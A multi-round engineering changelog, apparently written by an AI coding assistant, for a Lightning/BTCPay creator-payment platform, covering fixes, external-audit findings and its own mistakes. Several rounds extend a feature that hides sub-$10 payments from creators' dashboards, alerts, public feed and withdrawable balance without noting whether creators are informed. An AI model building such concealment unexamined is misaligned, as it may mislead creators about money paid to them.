Checked every `sendAlert()` call in the codebase — all seven are
operational (backup failures, health checks, reconciliation mismatches,
withdrawal payout failures). None of them announce an individual
settled payment; no such notification exists in this system today.

Built `should_suppress_payment_alert(amount)` anyway, so if a
per-payment Telegram/Discord notification is ever added, it can respect
the same toggle from day one rather than needing this reasoned through
again later. Reconciliation and health alerts are deliberately NOT
gated by this — those exist to tell admin about real problems in the
true, unfiltered ledger, and must never go quiet because a mismatch
happened to involve a small amount.

## 3. dashboard.html reorganized to match the admin panel's tab pattern

New "🏆 Earnings" tab. Moved off Overview: Charge level (tier progress)
and the Available-vs-earned meter. Overview now holds only the setup
banner, the six stat cards, and the platform notice — a quick glance,
not everything at once.

Added three new cards to the Earnings tab, backed by a new
`get_my_insights()` function: 7-day revenue, 30-day revenue, and
conversion rate (paid / total invoices). Filtered by the same
`small_payment_threshold()` every other creator-facing figure already
respects — a hidden payment is excluded from both sides of the
conversion ratio, not just the numerator, so it never drags the rate
down as a phantom "failure" either.

## 4. Instant Lightning withdraw for new creators — checked, not found

Traced every layer: the `auto_withdraw_enabled` column defaults to
`false` (0017); `handle_new_user()` doesn't set it at all, so new
profiles take that default; `admin_customer_directory()` reads it with
`coalesce(..., false)`; `admin.html`'s per-creator toggle reads that
value directly; `dashboard.html`'s withdraw-method dropdown gates on
`globalAuto && userAuto`, reading the global switch fresh on every load;
`user-withdraw`'s edge function enforces the same pair server-side.
Every layer already defaults to off and already requires both flags.

No fix shipped for this one — nothing wrong was found in the code. Most
likely explanation: the earlier fix (dashboard.html + user-withdraw)
hasn't reached the live Supabase/GitHub yet. Re-shipped both files
unchanged to remove any doubt about what's live, plus a verification
query to check the actual values in the live database directly.

---

# Six items, September 2026 (third round)

## 1. Admin "Load more" resetting itself

`admin.html`'s 15-second auto-refresh called `loadAllPayments(false)` —
which reset the offset to 0 and re-fetched only page one, discarding
whatever "Load more" progress the admin had made, every 15 seconds.

Fixed by giving `loadAllPayments` three explicit modes instead of one
boolean: `'reset'` (first load / filter change), `'more'` (Load more
button), `'refresh'` (the timer). Refresh re-fetches exactly as many
rows as are already on screen — in `ADMIN_PAY_MAX`-sized (200-row)
chunks if that is more than one page — and replaces the array in place,
so live data keeps flowing without ever losing scroll depth.

Verified in browser: loaded 400 rows via three "Load more" clicks,
simulated the 15-second refresh firing, confirmed all 400 rows survived
with no duplicate ids.

## 2. Small-payment history reaching Telegram/Discord

Audited every `sendAlert()` call in the codebase (7, across
`btcpay-webhook`, `daily-report`, `health`, `ledger-backup`,
`reconcile`, `user-withdraw`) — every single one is an *operational
failure* alert (BTCPay unreachable, a payout rejected, a health check
failing). None of them announce an individual settled payment; no such
notification exists anywhere in this system today, so there was nothing
currently leaking.

Built `should_suppress_payment_alert(amount)` as ready infrastructure
for if a "payment settled" notification is ever added — it respects the
same toggle and the same strict-under-$10 boundary as everything else —
but did not invent a new per-payment Telegram feature that wasn't asked
for. `reconcile` and `health`'s own alerts stay deliberately unfiltered:
they are admin-only integrity tools, and filtering them would let a real
discrepancy hide behind the same toggle that is supposed to only affect
what creators and moderators see.

## 3. Creator dashboard redesigned into an Earnings tab

New "Earnings" tab holds what used to be crammed into Overview: the
Charge level / tier progress, and the Available-vs-earned meter — plus
three new figures from a new `get_my_insights()` function: 7-day
revenue, 30-day revenue, and conversion rate (paid ÷ total invoices).

Every one of these three new figures is filtered by the same
`small_payment_threshold()` as the rest of the dashboard, for one
reason: "Total earned" on Overview and "30-day revenue" on Earnings
describe the same underlying payments, or the difference between them
reads as a bug rather than a feature. Conversion rate excludes a hidden
payment from *both* sides of the ratio — a probe payment invisible
everywhere else on the dashboard should not silently count as an
uncounted "failed" invoice either.

Overview and Transactions remain the first two tabs, unchanged.

## 4. Instant-Lightning-default bug

Re-verified all four layers directly against the code:

- `profiles.auto_withdraw_enabled boolean default false` (0017) — a new
  row gets `false` with no help from anywhere else.
- `handle_new_user()` never touches this column.
- `dashboard.html` only offers Lightning when `globalAuto && userAuto`.
- `user-withdraw` enforces the identical double-check server-side.

All four are correct. No bug found in the code. `VERIFY-lightning-default.sql`
was written so the owner can check their *live* database directly rather
than take "the code looks right" on faith — it reports the actual value
of the global switch and a new creator's own flag side by side, with a
plain-language verdict for each combination. The most likely explanation
given everything else checks out: the deployed `dashboard.html` or
`user-withdraw` predates this fix and needs redeploying.

## 5. `pay.cpay.io` and Cloudflare

Confirmed against current Cloudflare documentation (fetched fresh, not
from training data): a subdomain of a domain *already* on Cloudflare
does not need its own zone. Adding `pay.cpay.io` is just "Set up a
domain" in the Pages/Workers project's Custom Domains settings —
Cloudflare creates the DNS record automatically. `site_domains.purpose`
(`'payment' | 'site' | 'both'`, migration 0015) already exists in this
schema specifically to support serving payment links from a different
hostname than the main site, so this is a supported, built-in choice —
not a requirement.

## Verified

54 migrations parse clean, all 8 Edge Functions build, frontend static
checks pass, every `rpc()` call matches its SQL definition, `.github/workflows/verify.yml`
and `supabase/config.toml` both valid.

---

# Fresh-upload audit, September 2026 (fourth round)

The person's own editor tools (Sourcery, GitHub Copilot — visible in
`.vscode/settings.json`) had touched a few files locally since the last
delivery. Diffed the fresh upload against the last verified state file
by file rather than assuming either side was correct.

## Found: a real regression in `btcpay-webhook`

A `declare const Deno: {...}` block had been added, apparently to quiet
a local editor that doesn't know Deno's real global types. This is
genuinely dangerous in exactly one way: **it conflicts with Deno's own
ambient `Deno` global at real type-check time.**

Reproduced with `tsc` against a stub of Deno's actual global declaration
(the same technique real `deno check` uses):

```
error TS2451: Cannot redeclare block-scoped variable 'Deno'.
```

This does not affect what actually runs — ambient `declare` statements
never emit JavaScript, so Supabase's real Edge Runtime is untouched
either way — but it would have broken this project's own `deno check`
CI job, the exact tool built specifically to catch the class of error
`esbuild` cannot see (the same blind spot already found twice before, in
Round 3 and Round 4). Removed the block; confirmed with the same `tsc`
reproduction that the conflict is gone. Present only in
`btcpay-webhook` — checked all 8 functions.

## Found: a real bug already in a delivered file

`.github/workflows/verify.yml` — my own last delivery had a stray
trailing `"` at the end of the `ci/cloudai_regression.sql` line, which
would have broken that shell step with a shell quoting error. The
person's local tooling had already corrected it; adopted their fixed
version rather than re-introduce the bug by trusting my own last copy.

## Found: an exposed credential

`.vscode/settings.json` contained a live Sourcery API token, committed
to the repository. Editor-local settings files routinely carry personal
tokens exactly like this, which is why they don't normally belong in
version control at all.

**Action taken:** added `.vscode/settings.json` to `.gitignore`
(`.vscode/extensions.json` has no secret and was left alone).
**Action still needed, only the owner can do this:** rotate/revoke that
Sourcery token — anyone who has ever had read access to this repository
has already seen it in plaintext, and removing the file going forward
does not undo that.

## Adopted without changes needed

`ci/check_frontend.py` — refactored (context managers with explicit
`encoding="utf-8"`, a dict comprehension, a walrus operator). Functionally
identical to the previous version; re-ran it and confirmed it still
reports correctly. Adopted as a minor, harmless improvement.

## Also completed this round

**Dashboard now lands on Transactions**, matching `admin.html` exactly
— `admin.html`'s own first and default tab is "Transactions," not a
separate "Overview." Reordered the tab row (Transactions first,
Overview second) and changed `openInitialSection()`'s fallback.
Confirmed in browser: on load, the Transactions tab is active and
already showing real rows — `fetchPayments()` already ran during the
page's normal startup sequence, so nothing needed to change there.

**`login.html` recolored to the shared palette** — it had never been
migrated off the original violet/amber scheme from before the
green/near-black palette was unified across `admin.html`, `dashboard.html`
and `moderator.html`, making it the one page in the app that looked like
it belonged to a different product. Replaced its `:root` variables and
the handful of hardcoded colors (the bolt icon's fill) with the exact
values `admin.html` uses; the login *logic* (`doLogin`, `redirectByRole`,
the Enter-key handler) was not touched. `register.html` has the same old
palette and was not changed — flagged for the owner to decide on
separately.

## Verified

54 migrations parse clean, all 8 Edge Functions build (including the
corrected `btcpay-webhook`), frontend static checks pass, every `rpc()`
call matches its SQL definition, `.github/workflows/verify.yml` and
`supabase/config.toml` both valid.

---

# dashboard.html — two fixes, September 2026 (fifth round)

## 1. The "Copied" toast was invisible

`.toast{ background:var(--text); ... color:#fff; }` — the toast's
background was set to `var(--text)` (the theme's near-white *foreground*
colour, meant for text elsewhere on the page), with the message text
itself also white. White text on a near-white bubble reads as blank.
Every `showToast()` call was affected, not just copy — "Copied" was the
one the person actually clicked and stared at, so it's the one they
noticed.

Checked every other page for the same mistake — only `dashboard.html`
had it; `admin.html`'s toast was already correct (`background:var(--panel-hi)`,
colour set per outcome). Matched dashboard's toast to admin's exact
rule. Verified rendered: dark panel background, green text for a
`.toast.ok`.

## 2. Recent activity added to Overview

New panel directly under the stat-card grid: the most recent six
payments, compact rows with no filters or actions, a colour-coded status
badge, and a "View all" button that opens the full Transactions tab.
Deliberately a separate, lighter component from the Transactions tab's
expandable cards — reusing that full component here would have meant
either duplicating its filter-dependent logic or coupling Overview to
DOM elements that only exist on another tab.

Hooked into the *end* of `renderPayments()` rather than added
individually to its seven call sites, so every existing thing that
already refreshes the payment list — initial load, a mark toggle, a
realtime update — keeps this panel in sync automatically, with no way
for a future change to forget it.

**A mistake caught and fixed before shipping:** the first attempt lost
both the new CSS and the `renderRecentActivity()` function body — a
Python edit script ran two passes over the file but only the *second*
pass's `open(path, 'w').write(...)` actually landed, so the first pass's
changes were never persisted, even though the call site
(`renderRecentActivity();`) from a *later* edit was saved on top of the
unsaved version. The result type-checked as valid JavaScript (a function
call to something not yet defined is not a syntax error) but threw
`ReferenceError: renderRecentActivity is not defined` at runtime — caught
by actually loading the page in a browser and clicking through it, not
by static checks alone. Re-applied both pieces in one script with one
write; reproduced the original failure first to confirm this explanation
was right, then confirmed the fix.

## Verified

Browser-rendered the corrected file: three mock payments (settled,
pending, expired) each show with the right colour-coded badge, amount,
method and time; "View all" is present. 54 migrations parse clean, 8
Edge Functions build, frontend static checks pass.

---

# The alert-suppression hook was never actually wired in, September 2026

The person's own Telegram and Discord screenshots showed the exact
thing the earlier audit had concluded didn't exist: a "Payment settled"
notification firing for every settlement, including a $15 and a $5 one
— under the $10 threshold, with the hide-small-payments toggle on.

## Why the earlier audit missed it

That audit (documented above, "third round") searched the codebase for
`sendAlert(` and found 7 call sites, all operational-failure alerts,
concluding no per-payment notification existed. True at the time — but
`btcpay-webhook` had since gained a *second*, differently-named function,
`sendSettledAlert()`, added in a later edit. `sendSettledAlert` does not
contain `sendAlert` as a substring (`Settled` sits in the middle), so a
search for the wrong string silently missed it. `should_suppress_payment_alert()`
(migration 0054) was built and shipped as "ready infrastructure" for
exactly this case — but nothing had ever called it, because nobody knew
at the time that `sendSettledAlert` existed to call it from.

## Fixed

Both of `sendSettledAlert`'s call sites — the real BTCPay webhook path
and the `/admin-mark-settled` manual path — now check
`should_suppress_payment_alert(amount)` first and skip the alert
entirely when it returns true.

**Fails open, on purpose.** The check runs through `supabaseAdmin.rpc()`
wrapped in try/catch; any error — including the missing `service_role`
grant this exact change also had to add (0054 granted the function to
`authenticated` only, and `btcpay-webhook` calls through the service-role
key) — logs a warning and returns `false`, meaning the alert still sends.
Suppression is a privacy/noise concern; settlement is a money concern,
and nothing about muting a notification should ever be able to add risk
to the payment flow it sits beside.

## Verified

- `tsc --strict` against the real file (not just `esbuild`, which is
  what missed the `declare const Deno` regression two rounds ago) —
  zero errors.
- Extracted `shouldSuppressAlert()` and exercised all four paths against
  mocked responses: a small amount with the RPC returning `true`
  (suppressed), a large amount returning `false` (sent), the RPC
  returning a Postgres error (still sent — fails open), and the RPC
  throwing outright (still sent — fails open).
- 55 migrations parse clean, all 8 Edge Functions build.

---

# Public feed was never covered, September 2026 (seventh round)

The person's own screenshot of the logged-out home page's live payment
feed showed $4.00 and $5.00 rows — the exact thing the hide-small-payments
feature exists to hide, sitting in public, no account needed.

## Gap

0051 filtered the creator dashboard and moderator panel; 0053 extended
it to withdrawable balance. Neither ever reached `public_settled_feed()`
— the anonymized "recent payments" ticker on the home page. Same
oversight pattern as the alert-suppression miss two rounds ago: the
filter's own author didn't have a complete list of every place a
settled amount could surface, and this one wasn't on it.

## Fixed

`public_settled_feed()` now filters the same way as everywhere else:
`amount_settled >= small_payment_threshold()`, same toggle, same
strictly-under-$10 boundary. Verified against the exact numbers from
the screenshot — $4.00 and $5.00 excluded, $10.00, $15.00 and $25.00
kept.

## Checked and deliberately left alone

Audited every function granted to `anon` (`get_invoice_public`,
`get_link_preview`, `lookup_payment_status`, `public_settled_feed`) to
make sure nothing else was missed. The other three are all
exact-reference lookups — a payment's own UUID (the live invoice status
page a customer watches mid-payment), a link's slug (page metadata, no
amounts at all), or a 12+ character invoice ID/Lightning address someone
already has. None of them are a browsable list; filtering any of them
would break a legitimate self-service check without adding privacy
benefit, since nothing there is being discovered — only confirmed by
someone who already has the specific reference.

## Verified

Re-ran the isolated-function-body check that should have caught this
gap in the first place — every function that calls
`small_payment_threshold()` in its own body, checked with proper
non-overlapping regex boundaries after an earlier attempt at the same
check produced false positives (`admin_delete_link`, `is_admin`) from a
greedy match spanning multiple function definitions. 11 functions now
respect the threshold, `public_settled_feed` among them. 56 migrations
parse clean, 8 Edge Functions build, frontend checks pass.

---

# Third external audit review (Grok), September 2026 (eighth round)

Nine critical/high findings, each verified against the real code — not
trusted on the report's wording alone — before acting.

## Confirmed and fixed

1. **Payout timeout reverted a withdrawal to `pending`.** Both
   `user-withdraw`'s instant-auto-payout path and `btcpay-webhook`'s
   admin manual-payout path reverted to `pending` on *any* network
   error, including a timeout after BTCPay may have already sent the
   payout. `pending` is claimable again — a genuine double-payout path.
   Fixed: an ambiguous failure now leaves the row at `processing`
   (already claimed there, never re-claimable) and alerts, rather than
   guessing. A *definite* rejection from BTCPay still correctly reverts
   to `pending` — only the ambiguous case changed.

2. **`shop_locked` / `forced_shop_id` were never guarded.**
   `guard_profile_updates()` protected eight columns but not these two,
   added later in 0027. A creator could unlock their own admin-set rate
   lock with a plain `.update()`. Added to the guard.

3. **A paid withdrawal could be pushed back to `rejected`.** The RLS
   `USING` clause never restricted by current status, and the update
   trigger only ever protected amount/destination, never `status`. A
   direct API call (not anything admin.html's own UI does — confirmed
   its approve/reject flow goes through the `process-withdrawal` edge
   function, not a raw table update) could re-open an already-paid row,
   and `get_balance_for()` would then count that money as available
   again. Fixed with both a tighter RLS policy and a trigger that
   refuses any status change once a row is `paid` or `processing`.

4. **Webhook settlement race.** `create-invoice` polls BTCPay for a
   bolt11 string (up to ~2.4s) before the `payments` row exists.
   Confirmed against BTCPay's own documentation that a failed delivery
   is retried with the *same* delivery ID. If the row-not-found case
   left the dedup claim in place, the retry hit "Duplicate delivery"
   and never re-checked for the payment — a fast Lightning settlement
   could be permanently missed. Fixed: releasing the dedup claim when
   the payment row isn't found yet, so the next retry starts clean.

5. **The default Binance dropdown option sent `binance_id`**, which
   `VALID_METHODS` never accepted — the most visible option in the list
   always failed. Fixed to `binance`.

6. **Moderator login loop.** `login.html` only distinguished admin vs.
   everyone-else; `dashboard.html` bounced anything that wasn't
   `creator` back to `login.html` — an infinite redirect for any
   moderator, working around it only by opening `/moderator.html`
   directly. Fixed on both ends.

7. **`mod_list_payments()`** — 0028's original, unscoped payments query
   — was superseded by 0029's properly `handles_creator()`-scoped
   `staff_list_payments()` but never dropped. Nothing in the UI called
   it; the exposure was that any account with `role = 'moderator'`,
   assigned to zero creators or otherwise, could call it directly and
   read every settled payment on the platform. Dropped.

8. **`processing` could get stuck forever, invisible to health.** The
   final "mark paid" update after a successful BTCPay payout was never
   checked for its own error — a failed write there told the *client*
   "paid" while the *database* still said "processing," with nothing
   watching for it (`health`'s stuck-withdrawal check only looked at
   `pending`/`approved`). Fixed: the update is now checked, and alerts
   plus reports `processing` (not a false "paid") on failure;
   `health` gained a second, much tighter check — 15 minutes, not 24
   hours, since a row should only sit at `processing` for the length of
   one BTCPay call.

9. **`reconcile` had the 1000-row cap again**, on the query that lists
   already-known settled invoices for a cycle — a busy day could push
   real invoices past the cap, misreporting them as "missing" and
   firing a false integrity alert. Paginated, same pattern as the
   ledger backup's own fix for the identical mistake.

## Also fixed from the "medium" list

- **`record_audit()` was directly callable by any authenticated
  account.** Nothing calls it except from inside other
  `SECURITY DEFINER` functions that already check authorization — the
  direct grant let anyone write an arbitrary, misleading row into a log
  that exists to be trusted. Revoked; confirmed the internal callers
  keep working using the exact pattern `get_balance_for()` already
  relies on (`revoke all ... from authenticated`, still callable from
  inside another definer function, since that call runs as the
  function's owner).
- **`docs/DEPLOYMENT.md`** said migrations ran `0001 → 0018` and listed
  5 of the 8 edge functions to deploy. Updated to `0001 → 0057` and all
  8 functions.
- **Admin's hide-small-payments hint text** still said "This never
  touches withdrawable balance" — true when written, false since 0053
  deliberately changed that at the owner's request. Corrected, and
  updated the boundary wording to "strictly under" per 0053's fix.

## Reviewed and deliberately deferred, with reasoning

- **Webhook HMAC accepts any configured shop's secret for any
  invoice.** Real: the code accepts a signature matching *any* of the
  five configured secrets with no check that the matched secret's shop
  actually owns the invoice being settled. Not fixed here: doing this
  correctly needs confirming BTCPay's webhook payload actually carries
  a `storeId` field reliably, and building a secret-index-to-shop
  mapping that does not already exist in a safe, obvious form. Getting
  this wrong would *reject legitimate settlements* — a worse outcome
  than the current risk, which already requires a leaked secret (at
  which point the deployment has a bigger problem than this specific
  gap). Worth a dedicated, careful pass rather than a rushed one here.
- **Creator-restorable soft-deleted links, `variant_group` link-limit
  bypass, `deleted_by_admin`/`read_by_admin` flip, rate-limit fail-open,
  CDN pinning/SRI, reserved-slug list duplicated four places, HSTS,
  `register.html`'s old palette, payment-only domains serving
  `/admin`/`/login`.** Not independently re-verified or fixed this
  round — noted for a dedicated pass. None of them are money-movement
  paths the way the nine above are.

## Verified

57 migrations parse clean, all 8 Edge Functions build, the four
modified functions (`user-withdraw`, `btcpay-webhook`, `reconcile`,
`health`) type-checked with `tsc --strict` against the real files — not
just `esbuild`, which is what missed a real type error two rounds ago —
three came back clean, the fourth's one reported error traced to
pre-existing code this round never touched (a harness limitation:
`supabaseAdmin` stubbed as `any` loses element-type inference on an
untouched `.map()` a few lines away from this round's edits). Every
`rpc()` call matches its SQL definition. Both edited HTML files pass
full structural checks.

---

# Pricing, payouts, resellers and fee-based profit, September 2026

Six requested changes (a seventh — renaming creator/moderator to
freelancer/reseller in the UI — was dropped by the owner as not worth
the risk of touching ~90 occurrences, most of which are code
identifiers rather than display text).

## Settings toggles (reported as not working)

Found no bug. Checked, in order: `app_settings.key` is a real PRIMARY
KEY so `.upsert()` updates rather than duplicates; the read policy
(0027) is `is_admin() OR key IN (...)` so an admin reads every key; the
write policy (0002) is `FOR ALL USING (is_admin())`, and Postgres
reuses `USING` as `WITH CHECK` when the latter is absent; and a browser
test round-tripped a toggle correctly against a mocked client.

Wrote `VERIFY-settings-toggles.sql` instead of guessing — it reports
each toggle's stored value **and its JSON type**, because a value saved
as the string `"true"` rather than the boolean `true` fails every check
silently (`'true'::jsonb` and `'"true"'::jsonb` are different values),
and lists the live RLS policies as the database actually has them.

## Manual withdrawals master switch (0058)

`auto_withdraw_enabled` only ever controlled whether an already-created
Lightning withdrawal is processed instantly — it never stopped a
request being created. The new `manual_withdrawals_enabled` gates
`request_withdrawal()` itself, so the two are orthogonal and all four
combinations are meaningful. Signature-verified as unchanged.

## Per-user pricing (0059)

Confirmed against BTCPay's Greenfield API that **a per-invoice rate
override does not exist** — `checkout` carries speedPolicy,
paymentMethods, paymentTolerance and so on, but no rate rules. A shared
store therefore cannot price per user through BTCPay at all. CPAY
changes the amount it sends instead, which is equivalent from the
payer's side and entirely under our control.

`profiles.cost_percent`, set by the user via `set_my_cost_percent()`
(bounded by an admin ceiling in `app_settings.max_user_cost_percent`)
or overridden by the admin via `admin_set_cost_percent()`. Applied in
`create-invoice` as `round(amount * (1 + cost/100), 2)`, clamped to
0–100 defensively.

Tested: $100 at 3% → **$103.00**; 0% → unchanged; $19.99 at 3% →
$20.59; negative → clamped to 0; 250% → clamped to 100.

**The BTCPay store spread must be 0%** or the two compound — documented
in `docs/SETUP-REFERENCE.md` §1.1 as the single setting that silently
changes what every customer pays.

## Saved Lightning Address

A bolt11 invoice expires within the hour, so it can never be a saved
payout destination — which is why Lightning could never be automatic.
A Lightning Address (`you@wallet.com`) is static and resolves through
LNURL-pay at payout time. Confirmed via BTCPay's own release notes that
pull payments and payouts accept Lightning Addresses.

New `profiles.wallet_lightning_address` with a format CHECK,
`user-withdraw` now accepts either shape, and the dashboard prefills
the saved address when Lightning is selected. Wallet guidance listed in
the UI: Wallet of Satoshi, Blink, Alby, Phoenix, Zeus, Coinos, Primal,
Bitkit.

## Resellers own links and earn (0059)

Verified first that nothing in the database blocked this — the
`payment_links` RLS policies are `user_id = auth.uid()` with no role
test, and `enforce_link_limit()` reads whichever profile owns the row.
The real gaps were a missing link allowance (backfilled) and, found
only by running the dashboard as a reseller in a browser, that
`dashboard.html` bounced them to `moderator.html` — a redirect this
project added itself two rounds ago, correct then, wrong now that
resellers have their own earnings. Fixed, plus a "My earnings" link
from the moderator panel, which had no route to the dashboard at all.

## Admin profit is now real fees (0059)

Was `total_settled * (profit_margin_percent/100) / 2` — derived from
volume, matching no actual transaction, with an unexplained `/2`. Now
`sum(amount_requested - amount_after_fee)` over **paid** withdrawals:
what each user was actually charged.

## Two near-misses caught before shipping

**`admin_list_creators()` was almost destroyed.** The new people-list
was initially written as a redefinition of it — but that name already
belongs to the Messages sidebar (`id, email, display_name,
unread_count`). Changing its return type would have failed with 42P13
and, because Supabase runs a migration in one transaction, rolled back
everything else in the file. Shipped as `admin_list_people()` instead.
`admin_global_stats` had the same class of error: the draft dropped its
real `p_start`/`p_end` parameters and changed `pending_withdrawals_count`
from `int` to `bigint`. Both caught by a per-function signature diff
against every prior migration.

**`DROP FUNCTION` silently removes grants.** Extending
`system_link_for_invoice()` with `cost_percent` needs a DROP (return
type change). The original `grant ... to service_role` lives in
0022/0023 and would not re-apply — without re-granting it in 0059,
`create-invoice` would have failed on every single payment attempt.

## Verified

59 migrations parse clean, 8 Edge Functions build, all 8 pages pass
structural checks, every `rpc()` call matches its SQL definition,
workflow and config valid. Browser-tested three scenarios end to end
(freelancer with instant Lightning on, reseller with it on, freelancer
with it off): dashboard access, the Lightning option appearing exactly
once and disappearing when off, cost and ceiling loading, and the saved
address prefilling — no console errors in any of them.

Full operational reference written to `docs/SETUP-REFERENCE.md`.

---

# No ceiling on either percentage, September 2026

The owner corrected two limits that were assumptions rather than
requirements, and restated that the two percentages are separate
things — which they are, and which this codebase has confused before.

**`cost_percent`'s 25% admin ceiling is gone.** 0059 introduced
`max_user_cost_percent` on the assumption that "set your own price"
needed a guard rail. It does not — a user pricing their own work is
their own business decision, and a markup that is too high simply means
nobody pays their link. The setting row is **deleted**, not raised, so
no half-enforced limit is left behind to be rediscovered later. Its
entry in the authenticated read allowlist is removed too, rather than
left pointing at a key that will never return a row.

**`withdrawal_fee_percent`'s 50% ceiling is gone.** It had refused
anything above 50% since 0014. The admin sets this number and can
choose what it should be.

**What remains, and why it is not a policy ceiling:**

- Cost is bounded at 1000% purely as a **typo guard**. Without any
  bound, a fat-fingered `1000` instead of `10` charges a payer eleven
  times the intended amount with nothing to stop it. 1000% is far past
  any real pricing decision while still catching the accident.
- Fee is bounded at 100% because that is **arithmetic, not policy**.
  `request_withdrawal()` computes `amount * (1 - fee/100)`; at 100% the
  payout is exactly zero, and beyond it the payout goes negative —
  which is not a price, it is a broken calculation. Verified: $100 at
  110% computes to **-$10.00**.

**Client-side caps raised to match** in all three places (`saveDetailFee`,
`saveDefaultFee`, `saveDetailCost`) — a server limit with a stricter
browser check in front of it is just a confusing error message.

**The dashboard now shows both numbers together.** The old "Maximum
allowed: N%" hint pointed at a setting that no longer exists; it now
reads the user's own withdrawal fee instead, stated explicitly as
unrelated to the markup. Showing them side by side is what stops the
two being confused.

## Verified

Signature-diffed all three redefined functions (`set_my_cost_percent`,
`admin_set_cost_percent`, `admin_update_creator_fee`) against their live
definitions — all match exactly. 60 migrations parse clean, both edited
pages pass structural checks, frontend checks pass. Range-tested both
percentages across their old and new boundaries, and confirmed with a
worked example (40% cost, 60% fee) that the two compose independently.

---

# Two defects 0059 introduced, both mine, September 2026

An external review found both. Each was verified against this repo's own
code before being accepted — and in both cases the proof was already
sitting in the repository.

## 1. Creators could not set their own price at all

0059 added `cost_percent` to `guard_profile_updates()`'s blocked list,
with a comment of mine claiming `set_my_cost_percent()` "bypasses this
trigger legitimately" because it is SECURITY DEFINER.

That is wrong, and **this repo already knew it.** Migration 0019's own
comment explains that `auth.uid()` is null only when a *service-role*
JWT is used, because such a token carries no `sub` claim. SECURITY
DEFINER changes the effective role for permission checks; it does not
touch `request.jwt.claims`, the transaction-scoped GUC `auth.uid()`
reads. Called from a creator's own browser session, `auth.uid()` is that
creator's id and `is_admin()` is false — so the trigger fired on every
save with *"You may only change your display name and wallet details"*.

The entire self-service pricing feature was dead on arrival. Only the
admin path worked, because `is_admin()` short-circuits the guard.

**Fixed** by removing `cost_percent` from the guard, which is the
correct classification anyway. The guard exists for values a user must
not set for themselves — their fee, their link allowance, their role.
`cost_percent` is the opposite: theirs to choose, the same category as
the `wallet_*` columns 0059 deliberately left out for exactly that
reason. Nothing is lost, because 0060 already moved the only remaining
bound (the 0–1000 typo guard) into a table CHECK constraint that applies
to every write path, and the admin ceiling this guard was protecting no
longer exists.

## 2. Three different profit figures for the same period

0059 changed `admin_global_stats()` to report real fee revenue but left
`admin_daily_settled()` on `settled * margin / 2` — and missed a **third**
copy in `daily-report`'s TypeScript.

`admin_daily_settled()`'s own comment read *"Identical formula to
admin_global_stats(), so this list and the header stat card never drift
apart."* 0059 broke precisely the promise that comment was making.
`daily-report`'s said *"change it once and both follow"* — also broken.

**Fixed** by making the number come from one place. `daily_totals_for_cycle()`
— which `daily-report` already calls for every other figure in the row —
now returns `total_admin_profit`, and both `admin_daily_settled()` and
`daily-report` read it rather than recomputing. Fee revenue is attributed
by `processed_at`, the cycle the payout actually went out in, not the
cycle the underlying payments settled in.

## Also fixed: rate limiting multiplied by link variants

`create-invoice` limited invoices per `payment_link_id`, but
`create_link_variants()` gives one name up to four links — each with its
own id. Hitting all four gave four times the intended allowance for what
is, to the person abusing it, a single target.

Now scoped by owner: 30/minute across everything one user owns,
replacing 10/minute per link — higher than the old per-link number
because the scope is wider, far below the 40/minute four variants
previously allowed. It also **fails closed** now; a count query that
errors returns 503 rather than falling through to invoice creation, on
an unauthenticated endpoint that mints real invoices on a real node.

**A mistake caught mid-fix:** the first attempt wrote a SQL function,
`check_invoice_rate_limit()`, to hold this logic — but that rate limit
lives inline in TypeScript and no such function exists. It would have
shipped as dead code fixing nothing. Checked before trusting it, found
the real implementation, fixed it there. The second attempt then used a
PostgREST embedded `!inner` filter; a search turned up documented rough
edges combining embedded filters with `head`+`count`, so it was replaced
with a direct count on `payments.user_id` — a column that already exists
and is already indexed. On an unauthenticated money path, subtle query
semantics are not worth the elegance.

## Verified

61 migrations parse clean; 8 Edge Functions build; `daily-report` and
`create-invoice` both pass `tsc --strict` with zero errors (not just
esbuild, which has missed real type errors in this project twice);
frontend checks pass; `guard_profile_updates` and `admin_daily_settled`
signature-diffed as exact matches, and `daily_totals_for_cycle`'s
deliberate return-type change carries the required `DROP FUNCTION` and
re-grant — without which the nightly rollup would have failed silently.

---

# 0061 removed a protection this project had deliberately added

An external review caught this, and it is worth being precise about what
happened: this was not a missed hardening opportunity. Migration 0043
had locked `daily_totals_for_cycle()` down on purpose, with the reason
written directly above the line:

```
-- Only the cron reaches this, and it runs as the service role, which
-- bypasses grants entirely. Nothing signed in from a browser has any
-- reason to call it.
revoke all on function daily_totals_for_cycle(date)
  from public, anon, authenticated;
```

0061 had to `DROP` that function to add `total_admin_profit` (a
return-type change). Its own comment correctly warned that DROP removes
every grant — and then re-applied the wrong one, adding `authenticated`
alongside `service_role`. Knowing the hazard and still restoring the
wrong state is worse than not knowing it.

**Why it mattered.** The function is `SECURITY DEFINER` with no
authorization check at all — no `is_admin()`, no `auth.uid()`, nothing.
It is a raw aggregate over every payment and every withdrawal on the
platform. `admin_daily_settled()` is safe to grant to `authenticated`
precisely because it opens with an `is_admin()` guard; this has none.
Any signed-in account could have run it from a browser console and read
the platform's total settled revenue, payment count, total withdrawn and
total admin profit for any date.

**Fixed in 0062** by restoring 0043's exact revoke and granting only
`service_role`. Nothing breaks: the only two callers, `daily-report` and
`reconcile`, both use the service-role key, which bypasses grants
entirely. The `authenticated` grant was never needed — it came from
copying the shape of the many functions here that *do* have an internal
`is_admin()` check and therefore do belong on that list.

**An error in my own earlier check.** When writing 0061 I grepped for
`grant execute on function daily_totals_for_cycle` to find the original
grants, found nothing, and concluded none existed. The line I needed
said `revoke`, not `grant` — the search was for the wrong verb. Had it
covered both, 0043's deliberate lockdown would have been obvious.

**Swept for the same mistake elsewhere.** Reconstructed the net grant
state for every function by walking every grant and revoke in migration
order, then cross-referenced against whether each function body contains
any identity check. Seven functions are granted to `authenticated`
without one — `get_invoice_public`, `get_link_preview`,
`link_cost_for_slug`, `link_style_options`, `lookup_payment_status`,
`public_settled_feed`, `should_suppress_payment_alert`. Each was checked:
none aggregates across rows. Every one is either an exact-reference
lookup (needs a UUID, a slug, or a 12+ character invoice ID the caller
must already have) or public by design. `daily_totals_for_cycle()` was
the only function in the codebase that aggregates platform-wide money,
and the only one wrongly exposed.

**Also aligned:** `admin_global_stats()` now rounds fee revenue to 4
decimal places, matching `admin_daily_settled()`. Sub-cent and invisible
in practice — but 0061's entire point was that these two figures share
one definition and cannot drift, and leaving one rounded and one raw was
a small hole in exactly that guarantee.

## Verified

62 migrations parse clean; 8 Edge Functions build; frontend checks pass;
`admin_global_stats` signature-diffed as an exact match; the
reconstructed grant state now reads `daily_totals_for_cycle ->
[service_role]`, matching `get_balance_for`'s own locked-down precedent;
and no page in `public/` calls it, confirming nothing legitimate breaks.

---

